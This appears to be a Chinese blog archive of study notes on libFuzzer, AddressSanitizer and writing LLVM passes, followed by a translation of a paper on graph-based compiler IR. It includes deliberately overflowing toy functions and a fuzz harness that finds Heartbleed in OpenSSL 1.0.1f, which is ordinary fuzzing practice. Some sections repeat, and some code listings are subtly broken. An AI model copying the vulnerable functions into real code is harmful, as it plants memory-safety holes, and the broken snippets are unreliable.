if (UseCtorComdat &amp;&amp; TargetTriple.isOSBinFormatELF() &amp;&amp; CtorComdat) { AsanCtorFunction-&gt;setComdat(M.getOrInsertComdat(kAsanModuleCtorName)); appendToGlobalCtors(M, AsanCtorFunction, kAsanCtorAndDtorPriority, AsanCtorFunction); if (AsanDtorFunction) { AsanDtorFunction-&gt;setComdat(M.getOrInsertComdat(kAsanModuleDtorName)); appendToGlobalDtors(M, AsanDtorFunction, kAsanCtorAndDtorPriority, AsanDtorFunction); } } else { appendToGlobalCtors(M, AsanCtorFunction, kAsanCtorAndDtorPriority); if (AsanDtorFunction) appendToGlobalDtors(M, AsanDtorFunction, kAsanCtorAndDtorPriority); } return Changed;} sum 内存监控围绕 RZ 插桩来实现 对一些内存的状态进行shadow的映射，访问的时候进行状态检测 libfuzzer貌似编译完了，我去看看 radamsa【+】radamsa 学习libfuzzer中遇到的种种： 有corpus LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)的data是随机的，但size需要自己设置 max_len. libfuzzer option 指北 编译时用到的参数可以在 clang -help 中查看 -fsanitize=address： 表示使用 AddressSanitizer -fsanitize-coverage=trace-pc-guard: 为 libfuzzer 提供代码覆盖率信息 Seed: 1608565063 说明这次的种子数据 -max_len is not provided, using 64 ， -max_len 用于设置最大的数据长度，默认为 64 ASAN_OPTIONS=symbolize=1 ./first_fuzzer ./crash-id 显示栈 简单来说，如果我们要 fuzz 一个程序，找到一个入口函数，然后利用LLVMFuzzerTestOneInput就可以完成基本功能，然鹅： 我发现libfuzzer-interface还有几个接口类似于LLVMFuzzerCustomMutator。 练习写第一个fuzzer代码：测试最基本的溢出 编译选项：【+】 -fsanitize=fuzzer: 代码覆盖率 【+】 -fsanitize=address：启用 AddressSanitizer 【+】 -g：详细调试信息 运行选项：【+】 -seed：制定随机数 【+】 -max_len：指定 Data 最大长度 【+】 +dir: 指定 corpus 第二个123456789101112131415161718192021222324252627constexpr auto kMagicHeader = &quot;ZN_2016&quot;;constexpr std::size_t kMaxPacketLen = 1024;constexpr std::size_t kMaxBodyLength = 1024 - sizeof(kMagicHeader);bool VulnerableFunction2(const uint8_t* data, size_t size, bool verify_hash) { if (size &lt; sizeof(kMagicHeader)) return false; std::string header(reinterpret_cast&lt;const char*&gt;(data), sizeof(kMagicHeader)); std::array&lt;uint8_t, kMaxBodyLength&gt; body; if (strcmp(kMagicHeader, header.c_str())) return false; auto target_hash = data[--size]; if (size &gt; kMaxPacketLen) return false; if (!verify_hash) return true; std::copy(data, data + size, body.data()); auto real_hash = DummyHash(body); return real_hash == target_hash;} fuzzer_code：1234567#include &quot;vulnerable_functions.h&quot;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { VulnerableFunction2(data, size, true); VulnerableFunction2(data, size, false); return 0;} 这里有个tip：bool类型的变量太好遍历了，为了覆盖率测试两次就好:) 但是会如何影响覆盖率呢？是不是覆盖的呢？ 试一试把原函数中return true去掉，fuzzer.cc换成：123456#include &quot;vulnerable_functions.h&quot;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { VulnerableFunction2(data, size, false); return 0;} 覆盖率25，上一个覆盖率也是25（均crash） 再去掉1if (!verify_hash) 覆盖率降为24 wow很清晰：覆盖率就是整个fuzzer一趟测试触及的 basic-block 总个数。 第三个加了一个&amp; :123456constexpr std::size_t kZn2016VerifyHashFlag = 0x0001000;bool VulnerableFunction3(const uint8_t* data, size_t size, std::size_t flags) { bool verify_hash = flags &amp; kZn2016VerifyHashFlag; return VulnerableFunction2(data, size, verify_hash);} 那么还是遍历一下：123456extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { VulnerableFunction3(data, size, 0x00); VulnerableFunction3(data, size, 0x1001); return 0;} crash:) 第四个写到这里想到，写fuzz的目的就是crashcrashcrash，所以尽可能调整fuzz代码达到crash即可，没必要局限于格式。 开始第四个CVE-2014-0160: build123456tar xzf openssl1.0.1f.tgzcd openssl1.0.1f/./configmake cleanmake CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot; -j$(nproc) fuzzer.cc:123456789101112131415161718192021222324252627282930313233// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;openssl/ssl.h&gt;#include &lt;openssl/err.h&gt;#include &lt;assert.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#ifndef CERT_PATH# define CERT_PATH#endifextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { SSL_library_init(); SSL_load_error_strings(); ERR_load_BIO_strings(); OpenSSL_add_all_algorithms(); SSL_CTX *sctx; assert (sctx = SSL_CTX_new(TLSv1_method())); assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH &quot;server.pem&quot;, SSL_FILETYPE_PEM)); assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH &quot;server.key&quot;, SSL_FILETYPE_PEM)); SSL *server = SSL_new(sctx); BIO *sinbio = BIO_new(BIO_s_mem()); BIO *soutbio = BIO_new(BIO_s_mem()); SSL_set_bio(server, sinbio, soutbio); SSL_set_accept_state(server); BIO_write(sinbio, Data, Size); SSL_do_handshake(server); SSL_free(server); return 0;} 编译选项：1clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div -I openssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a ../../libFuzzer/libFuzzer.a -o openssl_fuzzer 跑出来了好几次 oom 和 leakmem ？ 去掉 leak 扩大内存1./openssl_fuzzer -detect_leaks=0 -rss_limit_mb=4096 花了一分钟才跑出来crash，why？？？ 如果把初始化api分开来看呢？123456789101112131415161718192021222324252627282930313233343536373839404142// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;openssl/ssl.h&gt;#include &lt;openssl/err.h&gt;#include &lt;assert.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#ifndef CERT_PATH# define CERT_PATH#endifSSL_CTX *Init() { SSL_library_init(); SSL_load_error_strings(); ERR_load_BIO_strings(); OpenSSL_add_all_algorithms(); SSL_CTX *sctx; assert (sctx = SSL_CTX_new(TLSv1_method())); /* These two file were created with this command: openssl req -x509 -newkey rsa:512 -keyout server.key \\ -out server.pem -days 9999 -nodes -subj /CN=a/ */ assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH &quot;server.pem&quot;, SSL_FILETYPE_PEM)); assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH &quot;server.key&quot;, SSL_FILETYPE_PEM)); return sctx;}extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { static SSL_CTX *sctx = Init(); SSL *server = SSL_new(sctx); BIO *sinbio = BIO_new(BIO_s_mem()); BIO *soutbio = BIO_new(BIO_s_mem()); SSL_set_bio(server, sinbio, soutbio); SSL_set_accept_state(server); BIO_write(sinbio, Data, Size); SSL_do_handshake(server); SSL_free(server); return 0;} 五秒钟？？？ 到底是那点会影响 fuzz 效率呢。。。 llvm PASS这一段当成是插入的知识，再看 ASAN 源码过程中意识到编写llvm pass 一定会对以后独自编写 fuzzer 框架有用的，因此今天除了接着研究ASAN源码之余要学习一下llvm pass的编写，目标是熟练掌握 ModulePass 以及 FunctionPass。 资料http://www.voidcn.com/article/p-mgwevrjr-brn.htmlhttp://llvm.org/docs/WritingAnLLVMPass.html#the-modulepass-classhttps://zhuanlan.zhihu.com/p/26129264https://blog.csdn.net/Mr_Megamind/article/details/78896717 环境配置12345678910111213141516apt-get install gitmkdir LLVM &amp;&amp; cd LLVMgit clone https://github.com/llvm-mirror/llvm.gitcd llvmcd toolsgit clone https://github.com/llvm-mirror/clang.gitcd ..mkdir build &amp;&amp; cd buildcd ~mkdir KLLVMcd LLVM/llvm/buildcmake -DLLVM_TARGETS_TO_BUILD=host -DCMAKE_INSTALL_PREFIX=~/KLLVM -DCMAKE_BUILD_TYPE=MinSizeRel -DLLVM_EXPERIMENTAL_TARGETS_TO_BUILD=WebAssembly -DLLVM_INCLUDE_EXAMPLES=OFF -DLLVM_INCLUDE_TESTS=OFF -DCLANG_INCLUDE_TESTS=OFF ..cmake --build . --target install -- -j3 使用clanghello.c123456#include &lt;stdio.h&gt; int main() { printf(&quot;hello worldn&quot;); return 0;} complier it1clang hello.c -o hello 输出llvmbitcode1clang -O3 -emit-llvm hello.c -c -o hello.bc -emit-llvm选项可与-S或-c选项一起使用，以分别为代码生成LLVM .ll或.bc文件。两者都是LLVM Bitcode，区别在于前者是可读的文本，后者是不可读的二进制格式。 使用lli执行.bc1lli hello.bc 使用llvm-dis对.bc反汇编1llvm-dis &lt; hello.bc 使用llc将.bc生成.s1llc hello.bc -o hello.s 常用的编译选项： -c： 只激活预处理,编译,和汇编,也就是他只把程序做成obj文件 -S： 只激活预处理和编译，就是指把文件编译成为汇编代码。 -O+num：优化等级 -emit-llvm：llvmbitcode 可与-c或-S 一同使用，但不能有链接 llvm IRhttps://releases.llvm.org/2.6/docs/tutorial/JITTutorial1.htmlhttps://releases.llvm.org/2.6/docs/LangRef.html 这块先挖个坑，过年后填回来。 我来填坑了： Identifiers 全局变量：@ 局部有命名的变量：%+string 局部未命名的变量：%+num 注释：； 如果计算结果未分配给命名值，则会创建未命名的临时值。 未命名的临时数据按顺序编号 High Level Structure Module 是llvm的翻译单元 每个Module包含functions，全局变量以及符号表 module可以被llvm-linker操作 function和全局变量都可以被看作global value 指令 ret: 1ret &lt;type&gt; &lt;value&gt; 123ret i32 5 ret void ret { i32, i8 } { i32 4, i8 2 } ; Return a struct of values 4 and 2 br: 1br i1 &lt;cond&gt;, label &lt;iftrue&gt;, label &lt;iffalse&gt; 1234567Test: %cond = icmp eq i32 %a, %b br i1 %cond, label %IfEqual, label %IfUnequalIfEqual: ret i32 1IfUnequal: ret i32 0 switch: 1switch &lt;intty&gt; &lt;value&gt;, label &lt;defaultdest&gt; [ &lt;intty&gt; &lt;val&gt;, label &lt;dest&gt; ... ] 1234567891011; Emulate a conditional br instruction %Val = zext i1 %value to i32 switch i32 %Val, label %truedest [ i32 0, label %falsedest ] ; Emulate an unconditional br instruction switch i32 0, label %dest [ ] ; Implement a jump table: switch i32 %val, label %otherwise [ i32 0, label %onzero i32 1, label %onone i32 2, label %ontwo ] invoke： 12&lt;result&gt; = invoke [cconv] [ret attrs] &lt;ptr to function ty&gt; &lt;function ptr val&gt;(&lt;function args&gt;) [fn attrs] to label &lt;normal label&gt; unwind label &lt;exception label&gt; 1234 %retval = invoke i32 @Test(i32 15) to label %Continue unwind label %TestCleanup ; {i32}:retval set%retval = invoke coldcc i32 %Testfnptr(i32 15) to label %Continue unwind label %TestCleanup ; {i32}:retval set 熟悉 LLVM API 使用code1：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748using namespace llvm;Module* makeLLVMModule() { // Module Construction Module* mod = new Module(&quot;test&quot;, getGlobalContext()); Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;, /*ret type*/ IntegerType::get(32), /*args*/ IntegerType::get(32), IntegerType::get(32), IntegerType::get(32), /*varargs terminated with null*/ NULL); Function* mul_add = cast&lt;Function&gt;(c); mul_add-&gt;setCallingConv(CallingConv::C); Function::arg_iterator args = mul_add-&gt;arg_begin(); Value* x = args++; x-&gt;setName(&quot;x&quot;); Value* y = args++; y-&gt;setName(&quot;y&quot;); Value* z = args++; z-&gt;setName(&quot;z&quot;); BasicBlock* block = BasicBlock::Create(getGlobalContext(), &quot;entry&quot;, mul_add); IRBuilder&lt;&gt; builder(block); Value* tmp = builder.CreateBinOp(Instruction::Mul, x, y, &quot;tmp&quot;); Value* tmp2 = builder.CreateBinOp(Instruction::Add, tmp, z, &quot;tmp2&quot;); builder.CreateRet(tmp2); return mod;}int main(int argc, char**argv) { Module* Mod = makeLLVMModule(); verifyModule(*Mod, PrintMessageAction); PassManager PM; PM.add(createPrintModulePass(&amp;outs())); PM.run(*Mod); delete Mod; return 0;} code2: :llvm 有自动的名称唯一性12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576Module* makeLLVMModule() { // constract module Module* mod = new Module(&quot;test&quot;, getGlobalContext()); // constract func Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;, /*ret type*/ IntegerType::get(32), /*args*/ IntegerType::get(32), IntegerType::get(32), /*varargs terminated with null*/ NULL); // cast this function Function* gcd = cast&lt;Function&gt;(c); //set arg Function::arg_iterator args = gcd-&gt;arg_begin(); Value* x = args++; x-&gt;setName(&quot;x&quot;); Value* y = args++; y-&gt;setName(&quot;y&quot;); //set basic blocks BasicBlock* entry = BasicBlock::Create(getGlobalContext(), (&quot;entry&quot;, gcd); BasicBlock* ret = BasicBlock::Create(getGlobalContext(), (&quot;return&quot;, gcd); BasicBlock* cond_false = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd); BasicBlock* cond_true = BasicBlock::Create(getGlobalContext(), (&quot;cond_true&quot;, gcd); BasicBlock* cond_false_2 = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd); //use IRBuild to fill the &lt;entry&gt; basicblocks IRBuilder&lt;&gt; builder(entry); //fill Value* xEqualsY = builder.CreateICmpEQ(x, y, &quot;tmp&quot;); builder.CreateCondBr(xEqualsY, ret, cond_false); //use &lt;SetInsertPoint&gt; to retarget the targetBB builder.SetInsertPoint(ret); //fill builder.CreateRet(x); builder.SetInsertPoint(cond_true); Value* yMinusX = builder.CreateSub(y, x, &quot;tmp&quot;); std::vector&lt;Value*&gt; args1; args1.push_back(x); args1.push_back(yMinusX); Value* recur_1 = builder.CreateCall(gcd, args1.begin(), args1.end(), &quot;tmp&quot;); builder.CreateRet(recur_1); builder.SetInsertPoint(cond_false_2); Value* xMinusY = builder.CreateSub(x, y, &quot;tmp&quot;); std::vector&lt;Value*&gt; args2; args2.push_back(xMinusY); args2.push_back(y); Value* recur_2 = builder.CreateCall(gcd, args2.begin(), args2.end(), &quot;tmp&quot;); builder.CreateRet(recur_2); return mod;} }int main(int argc, char**argv) { Module* Mod = makeLLVMModule(); verifyModule(*Mod, PrintMessageAction); PassManager PM; PM.add(createPrintModulePass(&amp;outs())); PM.run(*Mod); delete Mod; return 0;} 环境配置12345678910111213141516apt-get install gitmkdir LLVM &amp;&amp; cd LLVMgit clone https://github.com/llvm-mirror/llvm.gitcd llvmcd toolsgit clone https://github.com/llvm-mirror/clang.gitcd ..mkdir build &amp;&amp; cd buildcd ~mkdir KLLVMcd LLVM/llvm/buildcmake -DLLVM_TARGETS_TO_BUILD=host -DCMAKE_INSTALL_PREFIX=~/KLLVM -DCMAKE_BUILD_TYPE=MinSizeRel -DLLVM_EXPERIMENTAL_TARGETS_TO_BUILD=WebAssembly -DLLVM_INCLUDE_EXAMPLES=OFF -DLLVM_INCLUDE_TESTS=OFF -DCLANG_INCLUDE_TESTS=OFF ..cmake --build . --target install -- -j3 CMakeList使用cmake12345678&lt;project dir&gt;/ | CMakeLists.txt &lt;pass name&gt;/ | CMakeLists.txt Pass.cpp ... /CMakeLists.txt:123456find_package(LLVM REQUIRED CONFIG)add_definitions(${LLVM_DEFINITIONS})include_directories(${LLVM_INCLUDE_DIRS})add_subdirectory(&lt;pass name&gt;) cmake1:123456789101112if(NOT DEFINED ENV{LLVM_HOME}) message(FATAL_ERROR &quot;$LLVM_HOME is not defined&quot;)endif()if(NOT DEFINED ENV{LLVM_DIR}) set(ENV{LLVM_DIR} $ENV{LLVM_HOME}/lib/cmake/llvm)endif()find_package(LLVM REQUIRED CONFIG)add_definitions(${LLVM_DEFINITIONS})include_directories(${LLVM_INCLUDE_DIRS})link_directories(${LLVM_LIBRARY_DIRS}) add_subdirectory(P1umer) # Use your pass name here. cmake2:12345678910111213add_library(P1umerPass MODULE # List your source files here. P1umer.cpp)# Use C++11 to compile your pass (i.e., supply -std=c++11).target_compile_features(P1umerPass PRIVATE cxx_range_for cxx_auto_type)# LLVM is (typically) built with no C++ RTTI. We need to match that;# otherwise, we&apos;ll get linker errors about missing RTTI data.set_target_properties(P1umerPass PROPERTIES COMPILE_FLAGS &quot;-fno-rtti&quot;) 编写一个入门的pass示例 p1umer.cpp:1234567891011121314151617181920212223242526272829303132333435363738#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace { struct P1umerPass : public FunctionPass { static char ID; P1umerPass() : FunctionPass(ID) {} virtual bool doInitialization(Module &amp;) override { printf(&quot;11111111111\\n&quot;); return false; } virtual bool doFinalization(Module &amp;) { printf(&quot;22222222222\\n&quot;); return false; } virtual bool runOnFunction(Function &amp;F) { errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\\n&quot;; return false; } };}char P1umerPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic RegisterPass&lt;P1umerPass&gt; X(&quot;P1umer&quot;, &quot;Hello P1umer&quot;); use it:12clang -c -emit-llvm hello.c -o hello.bcopt -load ./libP1umerPass.so -P1umer hello.bc output:12311111111111I saw a function called mul_add!22222222222 熟悉依照CFG构建代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748using namespace llvm;Module* makeLLVMModule() { // Module Construction Module* mod = new Module(&quot;test&quot;, getGlobalContext()); Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;, /*ret type*/ IntegerType::get(32), /*args*/ IntegerType::get(32), IntegerType::get(32), IntegerType::get(32), /*varargs terminated with null*/ NULL); Function* mul_add = cast&lt;Function&gt;(c); mul_add-&gt;setCallingConv(CallingConv::C); Function::arg_iterator args = mul_add-&gt;arg_begin(); Value* x = args++; x-&gt;setName(&quot;x&quot;); Value* y = args++; y-&gt;setName(&quot;y&quot;); Value* z = args++; z-&gt;setName(&quot;z&quot;); BasicBlock* block = BasicBlock::Create(getGlobalContext(), &quot;entry&quot;, mul_add); IRBuilder&lt;&gt; builder(block); Value* tmp = builder.CreateBinOp(Instruction::Mul, x, y, &quot;tmp&quot;); Value* tmp2 = builder.CreateBinOp(Instruction::Add, tmp, z, &quot;tmp2&quot;); builder.CreateRet(tmp2); return mod;}int main(int argc, char**argv) { Module* Mod = makeLLVMModule(); verifyModule(*Mod, PrintMessageAction); PassManager PM; PM.add(createPrintModulePass(&amp;outs())); PM.run(*Mod); delete Mod; return 0;} code2: :llvm 有自动的名称唯一性12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576Module* makeLLVMModule() { // constract module Module* mod = new Module(&quot;test&quot;, getGlobalContext()); // constract func Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;, /*ret type*/ IntegerType::get(32), /*args*/ IntegerType::get(32), IntegerType::get(32), /*varargs terminated with null*/ NULL); // cast this function Function* gcd = cast&lt;Function&gt;(c); //set arg Function::arg_iterator args = gcd-&gt;arg_begin(); Value* x = args++; x-&gt;setName(&quot;x&quot;); Value* y = args++; y-&gt;setName(&quot;y&quot;); //set basic blocks BasicBlock* entry = BasicBlock::Create(getGlobalContext(), (&quot;entry&quot;, gcd); BasicBlock* ret = BasicBlock::Create(getGlobalContext(), (&quot;return&quot;, gcd); BasicBlock* cond_false = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd); BasicBlock* cond_true = BasicBlock::Create(getGlobalContext(), (&quot;cond_true&quot;, gcd); BasicBlock* cond_false_2 = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd); //use IRBuild to fill the &lt;entry&gt; basicblocks IRBuilder&lt;&gt; builder(entry); //fill Value* xEqualsY = builder.CreateICmpEQ(x, y, &quot;tmp&quot;); builder.CreateCondBr(xEqualsY, ret, cond_false); //use &lt;SetInsertPoint&gt; to retarget the targetBB builder.SetInsertPoint(ret); //fill builder.CreateRet(x); builder.SetInsertPoint(cond_true); Value* yMinusX = builder.CreateSub(y, x, &quot;tmp&quot;); std::vector&lt;Value*&gt; args1; args1.push_back(x); args1.push_back(yMinusX); Value* recur_1 = builder.CreateCall(gcd, args1.begin(), args1.end(), &quot;tmp&quot;); builder.CreateRet(recur_1); builder.SetInsertPoint(cond_false_2); Value* xMinusY = builder.CreateSub(x, y, &quot;tmp&quot;); std::vector&lt;Value*&gt; args2; args2.push_back(xMinusY); args2.push_back(y); Value* recur_2 = builder.CreateCall(gcd, args2.begin(), args2.end(), &quot;tmp&quot;); builder.CreateRet(recur_2); return mod;} }int main(int argc, char**argv) { Module* Mod = makeLLVMModule(); verifyModule(*Mod, PrintMessageAction); PassManager PM; PM.add(createPrintModulePass(&amp;outs())); PM.run(*Mod); delete Mod; return 0;} 编写一个稍复杂的pass官方文档 code1:12345678910111213141516171819202122232425262728using namespace llvm;namespace { struct IterInsideBB : public FunctionPass { static char ID; // Pass identification, replacement for typeid IterInsideBB() : FunctionPass(ID) {} bool runOnFunction(Function &amp;F) override { errs() &lt;&lt; &quot;Function name: &quot;; errs() &lt;&lt; F.getName() &lt;&lt; &apos;\\n&apos;; for(Function::iterator bb = F.begin(), e = F.end(); bb!=e; bb++) { errs()&lt;&lt;&quot;BasicBlock name = &quot;&lt;&lt; bb-&gt;getName() &lt;&lt;&quot;\\n&quot;; errs()&lt;&lt;&quot;BasicBlock size = &quot;&lt;&lt; bb-&gt;size() &lt;&lt; &quot;\\n\\n&quot;; for(BasicBlock::iterator i = bb-&gt;begin(), i2 = bb-&gt;end(); i!=i2; i++) { outs()&lt;&lt;&quot; &quot;&lt;&lt; *i &lt;&lt;&quot;\\n&quot;; } } return false; } };}char IterInsideBB::ID = 0;static RegisterPass&lt;IterInsideBB&gt; X(&quot;IterInsideBB&quot;, &quot;Iterate inside basicblocks inside a Function&quot;); code2:1234567891011121314151617181920212223242526272829303132namespace { struct UseDef : public FunctionPass { static char ID; // Pass identification, replacement for typeid UseDef() : FunctionPass(ID) {} bool runOnFunction(Function &amp;F) override { errs() &lt;&lt; &quot;Function name: &quot;; errs() &lt;&lt; F.getName() &lt;&lt; &apos;\\n&apos;; for(Function::iterator bb = F.begin(), e = F.end(); bb!=e; bb++) { for(BasicBlock::iterator i = bb-&gt;begin(), i2 = bb-&gt;end(); i!=i2; i++) { Instruction * inst = dyn_cast&lt;Instruction&gt;(i); if(inst-&gt;getOpcode() == Instruction::Add) { for(Use &amp;U: inst -&gt; operands()) { Value * v = U.get(); outs()&lt;&lt; *v &lt;&lt;&quot;\\n&quot;; } } } } return false; } };}char UseDef::ID = 0;static RegisterPass&lt;UseDef&gt; X(&quot;UseDef&quot;, &quot;This is use-def Pass&quot;); v1&lt;-loadint 8v2&lt;-operation add v1, v2","link":"/2019/02/20/libfuzzer & LLVM 初探/"},{"title":"IR's Journey","text":"Intro: From Quads to Graphs 1 介绍中间语言不是凭空产生的。中间语言是程序员的表述到具体的机器代码的转换辅助，而且必须弥合大量的语义差异，例如从一个 fortran 90 的机器码操作到一个三地址码表述的 add 语句。在高级语言到机器语言的转化过程中，一个优化编译器会执行很多次的 pass 来优化 IR 。使用者希望优化编译器能把这一过程执行的迅速而又准确；而编译器的编写者则希望优化代码能够尽可能的简单易懂且便于维护。我们的目标是设计轻量级的 IR 来使得简单语句可以得到快速优化。 本文讲述了中间语言从 quad-based form 到 graph-based form 的转化历程。转化的最终格式类似于(当然不是完全相同)一个 operator-level 的 Program Dependence Graph 或者说是 Gated Single Assignment。最终的形式包含执行程序所需要的所有信息。更重要的是，这种图表形式明确地包含 use-def 信息，分析过程中可以直接使用此信息而无需计算。分析过程中 Transformation 会直接在 IR 的基础上修改 use-def 信息，而无需额外的步骤。这种形式的的 graph 是一维的结构，而不是像 CFG 包含两个维度（分别是 basic blocks 和 instructions）。这种一维结构可以在我们的算法中体现出来。 使编译器快速运行的一个原则是尽可能早地完成尽可能多的工作。这引导我们在 one-pass 的前端加入强大的窥孔优化。我们设计的 IR 允许施行窥孔优化，在某种情况下，这种做法可以和 pessimistic conditional constant propagation 起到相同的效果。 【窥孔优化】： 一种很局部的优化方式，编译器仅仅在一个基本块或者多个基本块中，针对已经生成的代码，结合CPU自己指令的特点，通过一些认为可能带来性能提升的转换规则，或者通过整体的分析，通过指令转换，提升代码性能。 【稀疏有条件的常数传播】： 稀疏有条件的常数传播（sparse conditional constant propagation）是一个优化的技术，常用在以静态单赋值形式（SSA）进行最佳化的编译器，它可以移除 dead code elimination 以及进行 constant propagation。 【常数传播】： 编译原理课上的常数替换优化 本文不是关于如何写成一个完整的编译器，而是分享一种设计思路，可以从传统的 IR 过渡到 graph-based IR。 1.1 Pessimistic-vs-Optimistic我们将分析（和转换）分为两大类：Pessimistic &amp; Optimistic。Pessimistic analyses 假设了一种最坏的状况（conservatively correct）并且尝试去证明，而 Optimistic analyses 假设了一种最好地状况。处理“循环”外的情形中，这两种技术产生的结果相同。而在处理“循环”的过程中，Optimistic analyses 会假设一些从循环的 back edge 中产生的“fact”成立，在之后的步骤中可能会得到证明；而 Pessimistic techniques 则在循环进行中不产生任何假设，只使用已经确定的条件。这可能不能产生 do not already have 的事实。 举个栗子，在常数传播*(上面介绍过)的过程中，optimistic analysis 先假设循环 back edge 上的一些 def_value 等价于 constant，如果假设被证明成立，则可以进行一次 constant propagation。如果假设不成立，也没有害处啊2333…循环体只需要结合更加保守的 information 进行重新分析就可以了。 而针对 Pessimistic analysis，循环 back-edge 的 def_values 都被看作为变量，当这些所谓的“变量”与 loop 中的常量合并时，根据已有的信息分析器只能确定该个变量是个变量，符合了一开始的假设，因此这种分析无法找到更多的常量。 但是，如果没有循环，两种分析都可以访问包含所有已有 fact 的代码，也就是说，两种分析都可以找到一组等价的 facts。为了有效地做到这一点，分析需要按拓扑顺序访问代码；且关于特定值的信息必须在使用该值之前收集。如果无序访问代码，则一些分析必须在没有所有相关 fact 的情况下进行。在这种情况下，我们发现 Pessimistic analysis 可以在 one-pass 算法中可以 usefully proceed，因为缺少信息的条件下编译器做出的假设（或者说是具体的优化）会较为保守，而针对 Optimistic analysis 我们必须反复 visit 该块无序代码来验证那些较为积极但“危险”的假设。 1.2 Optimizations-in-the-Front-End由于我们可以在 one-pass 算法中进行 Pessimistic analysis ，因此我们可以在 Parseing 时执行此操作。当前端解析表达式时，分析器会为表达式指定一个保守值，并尝试根据以前解析的表达式来产生更好的 Parse 结果。只要解析器以拓扑顺序 Parse 代码，Pessimistic analysis 就像 optimistic analysis 一样好。我们观察到 Parser 按照拓扑顺序访问使用 if / then / else 结构构建的代码，在循环头或非结构化代码中，Pessimistic analysis 做出了保守正确的假设，这是非常令人开心的。 Pessimistic analysis 只需要我们在 Parse 代码时收集的 use-def 信息。编译器查看（并更改）包含某段 IR 的固定 region，在该块 region 外的区域代码在前者的产生和优化（transform）过程中不受影响。region 内的 IR 的转换同样也不依靠其他 IR_region 的信息。类似于窥孔优化的加强版。 通过在 Parse 中加入 Pessimistic analysis ，我们降低了整个程序的大小，而且减轻了后续优化阶段的工作量。（程序大小的缩减是因为我们通过 Pessimistic analysis 用一些新指令替换了原有的指令，后续优化阶段工作量的减少是由于我们提前完成了） 【use-def】： links at a value’s use site to the value’s definition sites 1.3 Overview Section 2：从带有基本指令块的传统CFG开始； Section 3：将这种表示适配到有明确的 use-def 信息的 SSA 格式 Section 4：再在其中加入控制依赖（control dependencies） Section 5：使用C++的继承为我们的指令提供更多结构并加速其创建和删除 Section 6：完全放弃CFG，取而代之的是处理 control 的指令 Section 7：增强的窥孔优化 Section 8：讨论如何处理各种 problematic 的指令特性（effect chain &amp; memory dependence 以后有时间总结） Section 9：删除所有 control 信息 Section A：lookat 基于终态 IR 的强大的 optimistic transformations 当我们在“进化”IR 时，我们也要“进化” pessimistic transformation technique，而且它最终会变成一种极其简单高效的优化技术，仅仅在分析循环和非结构化代码时较弱于 optimistic analysis。 2 In-the-Beginning让我们来具体看看CFG。CFG 是一个有向图，其节点是 basic blocks，边表示 control flow。Figure 1 表示了基本块的实现，是一个双层壳结构。CFG 包含了两个特殊块分别是没有输入的 Start block 和没有输出的 Stop block。每个 Basic block 包含有序的 instr 列表。每条指令都是一个四元组：opcode、目标变量和两个源变量。当然有时候源变量数量可能是 0~3 不等（这种情况就不叫四元组了）。四元组的实现在 Figure 2 中，是一个单维结构： 在四元组指令的具体表示中，opcode 通常占用 1~4 个字节。每个变量都被重命名为一个相当密集的 machine integer，作为符号表的索引。源变量和操作码一起称为表达式。该四元组可能还包含指向当前 Basic Blocks 的下一个四元组的指针。 粗略地说，基本块的语义如下所示 每条指令都是按顺序执行的 指令的执行包括： 解析所有源变量 在这些源上执行 opcode 指定的原语 将结果赋给目标变量 Basic block 的最后一条指令，不是写入目标变量，而是读取条件代码寄存器，并决定下面几个基块中的哪一个要执行（Jump condition）。 Stop 块的最后一条指令必须包含 Return_opcode。 start 块的第一条指令可以使用程序外部指定的 source（程序的输入）。 其余 IR 拓展功能按需添加。特别是子程序调用、内存（Load，Store）和 I/O 等等将进一步处理。 2.1 Pessimistic Transformations on Quads到目前为止，四元组仍然缺少所有的 use-def 信息，即：A 指令中用到的变量由哪条指令进行赋值？在应用 use-def 信息之前，窥孔优化仅仅依赖于一个固定大小的指令窗口来检查和转换。该技术非常薄弱，因为其依赖【指令顺序】来”确保”变量的使用接近于变量定义，这是不严谨的。所有现代的编译技术都依赖于 use-def 